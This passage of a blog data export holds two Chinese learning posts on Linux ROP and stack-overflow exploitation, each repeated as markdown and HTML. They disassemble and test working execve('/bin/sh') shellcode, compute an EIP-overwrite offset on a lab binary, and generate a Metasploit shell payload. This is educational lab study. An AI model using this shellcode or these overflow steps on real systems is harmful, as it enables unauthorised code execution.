// 调用号 0xb == 11\n0x13:  int 0x80         \\xcd\\x80  // 0x80中 断调用系统调用\n```\n\n由此可见，从反汇编角度这段 Shellcode 应该是有问题的，参数没有正常的传入。\n\n## 测试 Shellcode \n\n同样我们可以将这段 Shellcode 拷贝到测试程序中进行测试。\n\n```\nchar shellcode[] = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\";\n\nint main()\n{\n    int (*ret)() = (int(*)()) shellcode;\n    ret();\n}\n```\n\n然后使用 `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode` 进行编译，预期之内，直接报出 `Segmentation fault` 错误。说明这段 Shellcode 的确是有问题的。\n\n更换为\n\n```\n char shellcode[] =  \"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\n```\n\n测试正常，该段 Shellcode 可以参考文2来查看详细含义。\n\n# 参考链接\n\n[1.【Python】使用Python将Shellcode转换成汇编](https://bbs.pediy.com/thread-222965.htm)\n\n[2. Linux下shellcode的编写](https://xz.aliyun.com/t/2052)","source":"_posts/ROP-Shellcode.md","raw":"title: ROP 学习之 Shellcode\ndate: 2018-01-23 21:42:52\nupdated: 2018-01-27 17:32:12\ntags: [\"Linux\", \"Exploit\"]\n---\n\n# 0\n\n上一篇学习 ROP 的文章中提到原文的 Shellcode 调用失败了，这次就尝试分析下该 Shellcode 看看能不能找出原因。\n\n# 1. 对 Shellcode 反汇编\n\n拿到一段 Shellcode，第一步就是尝试反汇编，参考文章《使用 Python 将 Shellcode 转换成汇编》文章教程，基于 capstone 使用如下代码即可。\n\n```\n#!/usr/bin/env python2\n# -*- coding:utf-8 -*-\n\nfrom capstone import *\n\nfor code in shellcode:\n    md = Cs(CS_ARCH_X86, CS_MODE_32)\n    for i in md.disasm(code, 0x00):\n        print(\"0x%x:\\t%s\\t%s\" %(i.address, i.mnemonic, i.op_str))\n```\n\n从这段源码可以看到，这是利用 capstone 的反汇编功能来实现的，但是需要指定对应汇编的处理器架构和字长信息。\n\n# 2. 分析 Shellcode 原理\n\nLinu 下 Shellcode 的原理参考[《Linux下shellcode的编写》](https://xz.aliyun.com/t/2052)一文，关键是调用系统调用函数 execve。这个函数的参数如下：\n\n* 参数 1：file 文件名\n* 参数 2：NULL 即 0\n* 参数 3：NULL 即 0\n\n实现调用时，需要将系统调用号码 11 放入 eax 中，最终调用`int 0x80`实现函数调用。\n\n## ROP 教程中的 Shellcode 分析\n\n下面针对第一次调用失败的 Shellcode 反汇编得到的代码分析下：\n\n```\n0x0:   xor ecx, ecx     \\x31\\xc9  // 清空 ecx，即 ecx = 0\n0x2:   mul ecx          \\xf7\\xe1  // 貌似是无意义的 ecx清零指令\n0x4:   push ecx         \\x51      // 压入参数 0\n0x5:   push 0x68732f2f  \\x68\\x2f\\x2f\\x73\\x68  // 压入字符串\n0xa:   push 0x6e69622f  \\x68\\x2f\\x62\\x69\\x6e  // 压入字符串\n0xf:   mov ebx, esp     \\x89\\xe3  // 将字符串的地址传给 ebx\n0x11:  mov al, 0xb      \\xb0\\x0b  // 调用号 0xb == 11\n0x13:  int 0x80         \\xcd\\x80  // 0x80中 断调用系统调用\n```\n\n由此可见，从反汇编角度这段 Shellcode 应该是有问题的，参数没有正常的传入。\n\n## 测试 Shellcode \n\n同样我们可以将这段 Shellcode 拷贝到测试程序中进行测试。\n\n```\nchar shellcode[] = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\";\n\nint main()\n{\n    int (*ret)() = (int(*)()) shellcode;\n    ret();\n}\n```\n\n然后使用 `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode` 进行编译，预期之内，直接报出 `Segmentation fault` 错误。说明这段 Shellcode 的确是有问题的。\n\n更换为\n\n```\n char shellcode[] =  \"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\n```\n\n测试正常，该段 Shellcode 可以参考文2来查看详细含义。\n\n# 参考链接\n\n[1.【Python】使用Python将Shellcode转换成汇编](https://bbs.pediy.com/thread-222965.htm)\n\n[2. Linux下shellcode的编写](https://xz.aliyun.com/t/2052)","slug":"ROP-Shellcode","published":1,"comments":1,"layout":"post","photos":[],"_id":"clypxqmmv0014xrn59edv9msk","content":"<h1 id=\"0\"><a href=\"#0\" class=\"headerlink\" title=\"0\"></a>0</h1><p>上一篇学习 ROP 的文章中提到原文的 Shellcode 调用失败了，这次就尝试分析下该 Shellcode 看看能不能找出原因。</p>\n<h1 id=\"1-对-Shellcode-反汇编\"><a href=\"#1-对-Shellcode-反汇编\" class=\"headerlink\" title=\"1. 对 Shellcode 反汇编\"></a>1. 对 Shellcode 反汇编</h1><p>拿到一段 Shellcode，第一步就是尝试反汇编，参考文章《使用 Python 将 Shellcode 转换成汇编》文章教程，基于 capstone 使用如下代码即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python2</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\"></span><br><span class=\"line\">from capstone import *</span><br><span class=\"line\"></span><br><span class=\"line\">for code in shellcode:</span><br><span class=\"line\">    md = Cs(CS_ARCH_X86, CS_MODE_32)</span><br><span class=\"line\">    for i in md.disasm(code, 0x00):</span><br><span class=\"line\">        print(&quot;0x%x:\\t%s\\t%s&quot; %(i.address, i.mnemonic, i.op_str))</span><br></pre></td></tr></table></figure>\n\n<p>从这段源码可以看到，这是利用 capstone 的反汇编功能来实现的，但是需要指定对应汇编的处理器架构和字长信息。</p>\n<h1 id=\"2-分析-Shellcode-原理\"><a href=\"#2-分析-Shellcode-原理\" class=\"headerlink\" title=\"2. 分析 Shellcode 原理\"></a>2. 分析 Shellcode 原理</h1><p>Linu 下 Shellcode 的原理参考<a href=\"https://xz.aliyun.com/t/2052\">《Linux下shellcode的编写》</a>一文，关键是调用系统调用函数 execve。这个函数的参数如下：</p>\n<ul>\n<li>参数 1：file 文件名</li>\n<li>参数 2：NULL 即 0</li>\n<li>参数 3：NULL 即 0</li>\n</ul>\n<p>实现调用时，需要将系统调用号码 11 放入 eax 中，最终调用<code>int 0x80</code>实现函数调用。</p>\n<h2 id=\"ROP-教程中的-Shellcode-分析\"><a href=\"#ROP-教程中的-Shellcode-分析\" class=\"headerlink\" title=\"ROP 教程中的 Shellcode 分析\"></a>ROP 教程中的 Shellcode 分析</h2><p>下面针对第一次调用失败的 Shellcode 反汇编得到的代码分析下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0:   xor ecx, ecx     \\x31\\xc9  // 清空 ecx，即 ecx = 0</span><br><span class=\"line\">0x2:   mul ecx          \\xf7\\xe1  // 貌似是无意义的 ecx清零指令</span><br><span class=\"line\">0x4:   push ecx         \\x51      // 压入参数 0</span><br><span class=\"line\">0x5:   push 0x68732f2f  \\x68\\x2f\\x2f\\x73\\x68  // 压入字符串</span><br><span class=\"line\">0xa:   push 0x6e69622f  \\x68\\x2f\\x62\\x69\\x6e  // 压入字符串</span><br><span class=\"line\">0xf:   mov ebx, esp     \\x89\\xe3  // 将字符串的地址传给 ebx</span><br><span class=\"line\">0x11:  mov al, 0xb      \\xb0\\x0b  // 调用号 0xb == 11</span><br><span class=\"line\">0x13:  int 0x80         \\xcd\\x80  // 0x80中 断调用系统调用</span><br></pre></td></tr></table></figure>\n\n<p>由此可见，从反汇编角度这段 Shellcode 应该是有问题的，参数没有正常的传入。</p>\n<h2 id=\"测试-Shellcode\"><a href=\"#测试-Shellcode\" class=\"headerlink\" title=\"测试 Shellcode\"></a>测试 Shellcode</h2><p>同样我们可以将这段 Shellcode 拷贝到测试程序中进行测试。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char shellcode[] = &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int (*ret)() = (int(*)()) shellcode;</span><br><span class=\"line\">    ret();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后使用 <code>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode</code> 进行编译，预期之内，直接报出 <code>Segmentation fault</code> 错误。说明这段 Shellcode 的确是有问题的。</p>\n<p>更换为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char shellcode[] =  &quot;\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>测试正常，该段 Shellcode 可以参考文2来查看详细含义。</p>\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"https://bbs.pediy.com/thread-222965.htm\">1.【Python】使用Python将Shellcode转换成汇编</a></p>\n<p><a href=\"https://xz.aliyun.com/t/2052\">2. Linux下shellcode的编写</a></p>\n","excerpt":"","more":"<h1 id=\"0\"><a href=\"#0\" class=\"headerlink\" title=\"0\"></a>0</h1><p>上一篇学习 ROP 的文章中提到原文的 Shellcode 调用失败了，这次就尝试分析下该 Shellcode 看看能不能找出原因。</p>\n<h1 id=\"1-对-Shellcode-反汇编\"><a href=\"#1-对-Shellcode-反汇编\" class=\"headerlink\" title=\"1. 对 Shellcode 反汇编\"></a>1. 对 Shellcode 反汇编</h1><p>拿到一段 Shellcode，第一步就是尝试反汇编，参考文章《使用 Python 将 Shellcode 转换成汇编》文章教程，基于 capstone 使用如下代码即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python2</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\"></span><br><span class=\"line\">from capstone import *</span><br><span class=\"line\"></span><br><span class=\"line\">for code in shellcode:</span><br><span class=\"line\">    md = Cs(CS_ARCH_X86, CS_MODE_32)</span><br><span class=\"line\">    for i in md.disasm(code, 0x00):</span><br><span class=\"line\">        print(&quot;0x%x:\\t%s\\t%s&quot; %(i.address, i.mnemonic, i.op_str))</span><br></pre></td></tr></table></figure>\n\n<p>从这段源码可以看到，这是利用 capstone 的反汇编功能来实现的，但是需要指定对应汇编的处理器架构和字长信息。</p>\n<h1 id=\"2-分析-Shellcode-原理\"><a href=\"#2-分析-Shellcode-原理\" class=\"headerlink\" title=\"2. 分析 Shellcode 原理\"></a>2. 分析 Shellcode 原理</h1><p>Linu 下 Shellcode 的原理参考<a href=\"https://xz.aliyun.com/t/2052\">《Linux下shellcode的编写》</a>一文，关键是调用系统调用函数 execve。这个函数的参数如下：</p>\n<ul>\n<li>参数 1：file 文件名</li>\n<li>参数 2：NULL 即 0</li>\n<li>参数 3：NULL 即 0</li>\n</ul>\n<p>实现调用时，需要将系统调用号码 11 放入 eax 中，最终调用<code>int 0x80</code>实现函数调用。</p>\n<h2 id=\"ROP-教程中的-Shellcode-分析\"><a href=\"#ROP-教程中的-Shellcode-分析\" class=\"headerlink\" title=\"ROP 教程中的 Shellcode 分析\"></a>ROP 教程中的 Shellcode 分析</h2><p>下面针对第一次调用失败的 Shellcode 反汇编得到的代码分析下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0:   xor ecx, ecx     \\x31\\xc9  // 清空 ecx，即 ecx = 0</span><br><span class=\"line\">0x2:   mul ecx          \\xf7\\xe1  // 貌似是无意义的 ecx清零指令</span><br><span class=\"line\">0x4:   push ecx         \\x51      // 压入参数 0</span><br><span class=\"line\">0x5:   push 0x68732f2f  \\x68\\x2f\\x2f\\x73\\x68  // 压入字符串</span><br><span class=\"line\">0xa:   push 0x6e69622f  \\x68\\x2f\\x62\\x69\\x6e  // 压入字符串</span><br><span class=\"line\">0xf:   mov ebx, esp     \\x89\\xe3  // 将字符串的地址传给 ebx</span><br><span class=\"line\">0x11:  mov al, 0xb      \\xb0\\x0b  // 调用号 0xb == 11</span><br><span class=\"line\">0x13:  int 0x80         \\xcd\\x80  // 0x80中 断调用系统调用</span><br></pre></td></tr></table></figure>\n\n<p>由此可见，从反汇编角度这段 Shellcode 应该是有问题的，参数没有正常的传入。</p>\n<h2 id=\"测试-Shellcode\"><a href=\"#测试-Shellcode\" class=\"headerlink\" title=\"测试 Shellcode\"></a>测试 Shellcode</h2><p>同样我们可以将这段 Shellcode 拷贝到测试程序中进行测试。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char shellcode[] = &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int (*ret)() = (int(*)()) shellcode;</span><br><span class=\"line\">    ret();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后使用 <code>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode</code> 进行编译，预期之内，直接报出 <code>Segmentation fault</code> 错误。说明这段 Shellcode 的确是有问题的。</p>\n<p>更换为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char shellcode[] =  &quot;\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>测试正常，该段 Shellcode 可以参考文2来查看详细含义。</p>\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"https://bbs.pediy.com/thread-222965.htm\">1.【Python】使用Python将Shellcode转换成汇编</a></p>\n<p><a href=\"https://xz.aliyun.com/t/2052\">2. Linux下shellcode的编写</a></p>\n"},{"title":"从0开始学习Linux ROP利用-part1","date":"2017-11-22T21:19:23.000Z","updated":"2018-01-19T22:58:03.000Z","_content":"\n# 基础\n\nROP(Return-oriented programming) 是一种通过覆盖堆栈 (Stack) 内容来实现控制返回地址实现执行自定义代码的漏洞利用手段。目前比较流行的教程是蒸米写的Linux ROP系列，本文以此为基础，综合其他文章来详细的讲解Linux ROP利用国产。\n\n# 构造虚拟机环境\n\n测试过程中需要x86/x64两个环境的Linux系统，因此一般物理机测试起来比较麻烦，可以通过安装虚拟机来构造对应的测试环境。这里我使用 VirtualBox 来安装不同的测试环境，此外我选择基于 Alpine Linux 搭建测试环境，原因是 Alpine Linux 的镜像相对比较小，而且里面是基于 musl libc 实现了系统调用，意味着网上教程中的很多地方需要自己进行针对性的修改，这也是一个挑战。\n\n## 虚拟机网络配置\n\n为了方便测试，我选择使用 SSH 连接 Linux 主机执行命令，而不是从 VirtualBox 的界面，无法快捷的复制粘贴内外内容。使用 SSH 时需要有一个条件是物理机主动连接到虚拟机，但是默认的虚拟机环境采用 NAT 模式，虚拟机能够访问外网但是物理机无法访问虚拟机，这时可以额外添加一个 Host Only 网络来连接虚拟机。\n\n## Alpine Linux 基础环境搭建\n\n需要手动安装 gcc 和 libc-dev 库提供基础编译环境，安装 gdb 提供调试功能。\n\n```\napk add libc-dev gcc gdb\n```\n\n# 静态分析代码\n\n## 反汇编程序\n\n为了方便反汇编，可以将 gdb 的语法设置默认为 AT&T 语法改为 Intel 语法，具体方法如下：\n\n```\necho \"set disassembly-flavor intel\" > ~/.gdbinit\n```\n\n## GDB 指令简介\n\n\n* `b[reak] <行号|函数名|代码地址>` 下断点\n\n* `r[un]` 运行代码\n\n* `c[continue]` 继续运行\n\n* `s/n` Step into 单步跟踪进入/Step Over 单步跟踪\n\n* `si/ni` 汇编指令集 `s/n` \n\n* `p [varialbe/register]` 打印变量/寄存器\n\n\n## Debug 教程\n\n使用 `gdb level1` 来加载程序，然后调用 `disas vulnerable_function` 来反汇编存在漏洞的函数。输入 `layout asm` 分屏显示汇编代码， `b  vulnerable_function` 下断点，然后 `r` 开始运行程序，`p $eip` 打印当前 EIP 寄存器地址。\n\n```\n   0x00001220 <+0>:\t    push   ebp\n   0x00001221 <+1>:\t    mov    ebp,esp\n   0x00001223 <+3>:\t    push   ebx\n   0x00001224 <+4>:\t    sub    esp,0x84\n\n   0x0000122a <+10>:\tcall   0x1218 <__x86.get_pc_thunk.ax>\n   0x0000122f <+15>:\tadd    eax,0x2d99\n   0x00001234 <+20>:\tsub    esp,0x4          // <----a\n\n   0x00001237 <+23>:\tpush   0x100             // 256\n   0x0000123c <+28>:\tlea    edx,[ebp-0x88]    // -+\n   0x00001242 <+34>:\tpush   edx               // -+--  ebp-0x88为buf地址\n   0x00001243 <+35>:\tpush   0x0               // STDIN_FILENO\n   0x00001245 <+37>:\tmov    ebx,eax\n   0x00001247 <+39>:\tcall   0x1040 <read@plt> // 调用read函数\n\n   0x0000124c <+44>:\tadd    esp,0x10\n   0x0000124f <+47>:\tnop\n   0x00001250 <+48>:\tmov    ebx,DWORD PTR [ebp-0x4]\n   0x00001253 <+51>:\tleave                    // mov esp,ebp; pop ebp;\n   0x00001254 <+52>:\tret                      // pop eip; jump eip;\n\n   -----------------------\n\n   0x0000126f <+26>:\tcall   0x1220 <vulnerable_function> // push eip; jump XX;\n\n```\n\n汇编代码中有一个函数 `__x86.get_pc_thunk.ax` 的调用，在此可以暂时忽略这段代码，与 EOP 利用无关，没有任何影响。关于这个函数的详细解释，参考 [《什么是__i686.get_pc_thunk.bx？我们为什么需要调用这个？》](https://cloud.tencent.com/developer/ask/91473) 一文。\n\n## 堆栈分析\n\n下面先从理论上对堆栈情况分析一下。首先要注意的是，esp 指针是指向栈顶，即当前已经使用的空间。执行汇编指令到 a 处，堆栈如下：\n\n![初始堆栈](/img/rop_stack_1.png)\n\n通过`si`和`ni`指令执行到read函数之前，此时的堆栈如下图2：\n\n![调用read函数前的堆栈](/img/rop_stack_2.png)\n\n通过调试发现此时堆栈中有两个空位 0xbffffcb0 和 0xbffffc2c，猜测可能是多余的代码导致的。调用完 read 函数，输入内容后，进行堆栈平衡，此时堆栈变成下图：\n\n![调用read函数后的堆栈](/img/rop_stack_3.png)\n\n调用指令 `x /8cb 0xbffffc30`  可以显示出输入的前 8 个字符。继续往下执行，这时候会返回，会调用 `leave` 指令再次堆栈平衡，释放函数中的临时变量，并恢复原有函数栈帧的 esp 。最后执行 `ret` 指令，至此整个执行流完毕。\n\n## 漏洞原理\n\n很明显，read 函数没有对输入的内容校验长度，导致可以输入超长字符串，利用字符串覆盖 eip(0xbffffcbc) ，则我们就可以控制这个函数的返回地址，实现漏洞利用。通过计算可以得到 0xbffffcbc - 0xbffffc30 = 0x8c，即使用 0x8c + 0x04 长度的字符串覆盖，最后的四字节就可以覆盖成功。对比原文中提供的通过脚本获取覆盖长度脚本，可以发现与我们分析的一致。\n\n## 生成 Shellcode\n\n很可惜，使用教程中所提供的 shellcode 时存在问题，进程仍然 crash，不过使用 Metasploit 生成要的 Shellcode 却能够正常执行。生成 Shellcode 的具体做法如下，进入 msfconsole，使用 `show payloads` 可以看到所有支持的 payload。然后 `use linux/x86/exec` 来选用当前环境的 payload ，输入 `info` 查看当前 payload 的参数，用 `set CMD /bin/s` 来生成执行 `sh` 的 shellcode，最后使用 `generate` 命令来生成。\n\n## 执行 Shellcode\n\n最初的想法是在 Alpine 中安装 pwntools 工具本地执行，但是发现安装了一系列软件后，最终因为某个库不支持 x86 环境而安装失败，相关需要安装的库如下，有需要的可以参考下：\n\n```\napk add --no-cache -X https://mirrors.tuna.tsinghua.edu.cn/alpine/edge/community/ capstone-dev\napk add python3 python3-dev alpine-sdk libffi-dev openssl-dev\npip install pwntools\n```\n\n因为 pwntools 安装失败，所以使用 socat 命令来起服务，`socat TCP4-LISTEN:5001,fork EXEC:./level1`，这里同样要重新寻找对应的返回地址，因此第一次可以输入一个错误的 Shellcode，然后同样使用`gdb level1 core.xxxxx` 命令来调试 coredump 文件，显示具体的返回地址，再重新修改 shellcode 中的返回内容。\n\n![执行成功](/img/rop_execute.png)\n\n# 后记\n\n虽然这个教程篇幅不长，但是自己复现整个过程却充满了坎坷，断断续续花了两个月的时间，所幸第一次总是艰难的，后续会应该轻松很多吧，加油！\n\n# 参考文章列表\n\n[VirtualBox虚拟机和Mac或Win主机之间网络相互通信](https://segmentfault.com/a/1190000012756506)\n\n[一步一步学ROP](https://github.com/zhengmin1989/MyArticles/tree/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP)\n\n[一步一步学ROP 镜像文 ](http://drops.2xss.cc/?chamd5#!/drops/595.%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x86%E7%AF%87)\n\n[Introduction to Return Oriented Programming (ROP)](https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/)\n\n[栈溢出漏洞的利用和缓解](https://www.cnblogs.com/pannengzhi/p/exploit-the-stack.html)\n\n[StackOverFlow之Ret2ShellCode详解](https://www.freebuf.com/vuls/179724.html)\n\n[常用GDB指令](https://www.jianshu.com/p/b7896e9afeb7)","source":"_posts/ROP-part1.md","raw":"title: 从0开始学习Linux ROP利用-part1\ndate: 2017-11-22 21:19:23\nupdated: 2018-01-19 22:58:03\ntags: [\"Linux\", \"Exploit\"]\n---\n\n# 基础\n\nROP(Return-oriented programming) 是一种通过覆盖堆栈 (Stack) 内容来实现控制返回地址实现执行自定义代码的漏洞利用手段。目前比较流行的教程是蒸米写的Linux ROP系列，本文以此为基础，综合其他文章来详细的讲解Linux ROP利用国产。\n\n# 构造虚拟机环境\n\n测试过程中需要x86/x64两个环境的Linux系统，因此一般物理机测试起来比较麻烦，可以通过安装虚拟机来构造对应的测试环境。这里我使用 VirtualBox 来安装不同的测试环境，此外我选择基于 Alpine Linux 搭建测试环境，原因是 Alpine Linux 的镜像相对比较小，而且里面是基于 musl libc 实现了系统调用，意味着网上教程中的很多地方需要自己进行针对性的修改，这也是一个挑战。\n\n## 虚拟机网络配置\n\n为了方便测试，我选择使用 SSH 连接 Linux 主机执行命令，而不是从 VirtualBox 的界面，无法快捷的复制粘贴内外内容。使用 SSH 时需要有一个条件是物理机主动连接到虚拟机，但是默认的虚拟机环境采用 NAT 模式，虚拟机能够访问外网但是物理机无法访问虚拟机，这时可以额外添加一个 Host Only 网络来连接虚拟机。\n\n## Alpine Linux 基础环境搭建\n\n需要手动安装 gcc 和 libc-dev 库提供基础编译环境，安装 gdb 提供调试功能。\n\n```\napk add libc-dev gcc gdb\n```\n\n# 静态分析代码\n\n## 反汇编程序\n\n为了方便反汇编，可以将 gdb 的语法设置默认为 AT&T 语法改为 Intel 语法，具体方法如下：\n\n```\necho \"set disassembly-flavor intel\" > ~/.gdbinit\n```\n\n## GDB 指令简介\n\n\n* `b[reak] <行号|函数名|代码地址>` 下断点\n\n* `r[un]` 运行代码\n\n* `c[continue]` 继续运行\n\n* `s/n` Step into 单步跟踪进入/Step Over 单步跟踪\n\n* `si/ni` 汇编指令集 `s/n` \n\n* `p [varialbe/register]` 打印变量/寄存器\n\n\n## Debug 教程\n\n使用 `gdb level1` 来加载程序，然后调用 `disas vulnerable_function` 来反汇编存在漏洞的函数。输入 `layout asm` 分屏显示汇编代码， `b  vulnerable_function` 下断点，然后 `r` 开始运行程序，`p $eip` 打印当前 EIP 寄存器地址。\n\n```\n   0x00001220 <+0>:\t    push   ebp\n   0x00001221 <+1>:\t    mov    ebp,esp\n   0x00001223 <+3>:\t    push   ebx\n   0x00001224 <+4>:\t    sub    esp,0x84\n\n   0x0000122a <+10>:\tcall   0x1218 <__x86.get_pc_thunk.ax>\n   0x0000122f <+15>:\tadd    eax,0x2d99\n   0x00001234 <+20>:\tsub    esp,0x4          // <----a\n\n   0x00001237 <+23>:\tpush   0x100             // 256\n   0x0000123c <+28>:\tlea    edx,[ebp-0x88]    // -+\n   0x00001242 <+34>:\tpush   edx               // -+--  ebp-0x88为buf地址\n   0x00001243 <+35>:\tpush   0x0               // STDIN_FILENO\n   0x00001245 <+37>:\tmov    ebx,eax\n   0x00001247 <+39>:\tcall   0x1040 <read@plt> // 调用read函数\n\n   0x0000124c <+44>:\tadd    esp,0x10\n   0x0000124f <+47>:\tnop\n   0x00001250 <+48>:\tmov    ebx,DWORD PTR [ebp-0x4]\n   0x00001253 <+51>:\tleave                    // mov esp,ebp; pop ebp;\n   0x00001254 <+52>:\tret                      // pop eip; jump eip;\n\n   -----------------------\n\n   0x0000126f <+26>:\tcall   0x1220 <vulnerable_function> // push eip; jump XX;\n\n```\n\n汇编代码中有一个函数 `__x86.get_pc_thunk.ax` 的调用，在此可以暂时忽略这段代码，与 EOP 利用无关，没有任何影响。关于这个函数的详细解释，参考 [《什么是__i686.get_pc_thunk.bx？我们为什么需要调用这个？》](https://cloud.tencent.com/developer/ask/91473) 一文。\n\n## 堆栈分析\n\n下面先从理论上对堆栈情况分析一下。首先要注意的是，esp 指针是指向栈顶，即当前已经使用的空间。执行汇编指令到 a 处，堆栈如下：\n\n![初始堆栈](/img/rop_stack_1.png)\n\n通过`si`和`ni`指令执行到read函数之前，此时的堆栈如下图2：\n\n![调用read函数前的堆栈](/img/rop_stack_2.png)\n\n通过调试发现此时堆栈中有两个空位 0xbffffcb0 和 0xbffffc2c，猜测可能是多余的代码导致的。调用完 read 函数，输入内容后，进行堆栈平衡，此时堆栈变成下图：\n\n![调用read函数后的堆栈](/img/rop_stack_3.png)\n\n调用指令 `x /8cb 0xbffffc30`  可以显示出输入的前 8 个字符。继续往下执行，这时候会返回，会调用 `leave` 指令再次堆栈平衡，释放函数中的临时变量，并恢复原有函数栈帧的 esp 。最后执行 `ret` 指令，至此整个执行流完毕。\n\n## 漏洞原理\n\n很明显，read 函数没有对输入的内容校验长度，导致可以输入超长字符串，利用字符串覆盖 eip(0xbffffcbc) ，则我们就可以控制这个函数的返回地址，实现漏洞利用。通过计算可以得到 0xbffffcbc - 0xbffffc30 = 0x8c，即使用 0x8c + 0x04 长度的字符串覆盖，最后的四字节就可以覆盖成功。对比原文中提供的通过脚本获取覆盖长度脚本，可以发现与我们分析的一致。\n\n## 生成 Shellcode\n\n很可惜，使用教程中所提供的 shellcode 时存在问题，进程仍然 crash，不过使用 Metasploit 生成要的 Shellcode 却能够正常执行。生成 Shellcode 的具体做法如下，进入 msfconsole，使用 `show payloads` 可以看到所有支持的 payload。然后 `use linux/x86/exec` 来选用当前环境的 payload ，输入 `info` 查看当前 payload 的参数，用 `set CMD /bin/s` 来生成执行 `sh` 的 shellcode，最后使用 `generate` 命令来生成。\n\n## 执行 Shellcode\n\n最初的想法是在 Alpine 中安装 pwntools 工具本地执行，但是发现安装了一系列软件后，最终因为某个库不支持 x86 环境而安装失败，相关需要安装的库如下，有需要的可以参考下：\n\n```\napk add --no-cache -X https://mirrors.tuna.tsinghua.edu.cn/alpine/edge/community/ capstone-dev\napk add python3 python3-dev alpine-sdk libffi-dev openssl-dev\npip install pwntools\n```\n\n因为 pwntools 安装失败，所以使用 socat 命令来起服务，`socat TCP4-LISTEN:5001,fork 